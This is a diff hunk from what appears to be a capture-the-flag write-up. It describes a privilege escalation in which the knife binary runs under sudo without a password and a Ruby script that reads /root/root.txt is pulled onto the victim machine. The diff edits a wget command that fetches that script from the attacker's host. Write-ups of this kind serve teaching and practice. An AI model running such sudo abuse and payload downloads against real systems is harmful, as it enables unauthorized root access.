@@ -12,7 +12,7 @@ Modified script for my needs (removed extra code and made infinite loop of comma
 Found `/usr/bin/knife` could be run with `sudo` with *no password*.   
 Created a script called `read.rb` (see in this directory) that reads `/root/root.txt` and then downloaded it with `wget` to the victim machine:
 ```bash
-wget http://my-ip:8000/read.rb
+wget http://my-ip:8000/read.rb -O /home/james/read.rb
 ```
 I could've done this in smarted way, but let's leave this as it is.  
 Then ran this:
